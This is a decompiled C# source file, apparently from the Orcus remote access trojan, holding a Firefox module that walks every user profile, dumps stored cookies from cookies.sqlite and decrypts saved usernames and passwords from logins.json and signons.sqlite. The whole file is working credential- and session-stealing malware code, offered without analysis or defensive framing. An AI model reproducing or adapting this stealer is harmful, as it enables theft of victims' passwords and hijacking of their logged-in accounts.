using System;
using System.Collections.Generic;
using System.IO;
using System.Web.Script.Serialization;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Mozilla;

internal class Firefox : ICookieRecovery, IPasswordRecovery
{
	private const string ApplicationName = "Mozilla Firefox";

	public IEnumerable<RecoveredCookie> GetCookies()
	{
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		List<RecoveredCookie> list = new List<RecoveredCookie>();
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
		if (!directoryInfo.Exists)
		{
			return list;
		}
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		for (int i = 0; i < directories.Length; i++)
		{
			FileInfo fileInfo = new FileInfo(Path.Combine(directories[i].FullName, "cookies.sqlite"));
			if (!fileInfo.Exists)
			{
				continue;
			}
			SQLiteHandler sQLiteHandler = new SQLiteHandler(fileInfo.FullName);
			if (!sQLiteHandler.ReadTable("moz_cookies"))
			{
				continue;
			}
			int rowCount = sQLiteHandler.GetRowCount();
			for (int j = 0; j < rowCount; j++)
			{
				try
				{
					string value = sQLiteHandler.GetValue(j, "host");
					string value2 = sQLiteHandler.GetValue(j, "name");
					string value3 = sQLiteHandler.GetValue(j, "value");
					string value4 = sQLiteHandler.GetValue(j, "path");
					bool secure = sQLiteHandler.GetValue(j, "isSecure") != "0";
					bool httpOnly = sQLiteHandler.GetValue(j, "isSecure") != "0";
					DateTime expiresUtc = TimeHelper.FromUnixTime(long.Parse(sQLiteHandler.GetValue(j, "expiry")));
					RecoveredCookie val = new RecoveredCookie();
					val.set_Host(value);
					val.set_ExpiresUtc(expiresUtc);
					val.set_Name(value2);
					val.set_Value(value3);
					val.set_Path(value4);
					val.set_Secure(secure);
					val.set_HttpOnly(httpOnly);
					val.set_ApplicationName("Mozilla Firefox");
					list.Add(val);
				}
				catch (Exception)
				{
					break;
				}
			}
		}
		return list;
	}

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Expected O, but got Unknown
		List<RecoveredPassword> list = new List<RecoveredPassword>();
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
		if (!directoryInfo.Exists)
		{
			return list;
		}
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			if (!new FileInfo(Path.Combine(directoryInfo2.FullName, "key3.db")).Exists)
			{
				continue;
			}
			MozillaDecryptor mozillaDecryptor = new MozillaDecryptor();
			try
			{
				if (!mozillaDecryptor.Initialize(directoryInfo2.FullName))
				{
					continue;
				}
			}
			catch (Exception)
			{
				continue;
			}
			FileInfo fileInfo = new FileInfo(Path.Combine(directoryInfo2.FullName, "logins.json"));
			if (fileInfo.Exists)
			{
				try
				{
					LoginData[] logins = new JavaScriptSerializer().Deserialize<FirefoxLogins>(File.ReadAllText(fileInfo.FullName)).logins;
					foreach (LoginData loginData in logins)
					{
						RecoveredPassword val = new RecoveredPassword();
						val.set_Application("Mozilla Firefox");
						val.set_UserName(mozillaDecryptor.DecryptString(loginData.encryptedUsername));
						val.set_Password(mozillaDecryptor.DecryptString(loginData.encryptedPassword));
						val.set_Field1(loginData.hostname);
						val.set_PasswordType((PasswordType)0);
						list.Add(val);
					}
				}
				catch (Exception)
				{
				}
			}
			FileInfo fileInfo2 = new FileInfo(Path.Combine(directoryInfo2.FullName, "signons.sqlite"));
			if (!fileInfo2.Exists)
			{
				continue;
			}
			try
			{
				SQLiteHandler sQLiteHandler = new SQLiteHandler(fileInfo2.FullName);
				if (!sQLiteHandler.ReadTable("moz_logins"))
				{
					continue;
				}
				int rowCount = sQLiteHandler.GetRowCount();
				for (int k = 0; k < rowCount; k++)
				{
					try
					{
						string value = sQLiteHandler.GetValue(k, "encryptedUsername");
						string value2 = sQLiteHandler.GetValue(k, "encryptedPassword");
						string value3 = sQLiteHandler.GetValue(k, "hostname");
						RecoveredPassword val2 = new RecoveredPassword();
						val2.set_Application("Mozilla Firefox");
						val2.set_UserName(mozillaDecryptor.DecryptString(value));
						val2.set_Password(mozillaDecryptor.DecryptString(value2));
						val2.set_Field1(value3);
						val2.set_PasswordType((PasswordType)0);
						list.Add(val2);
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}
}
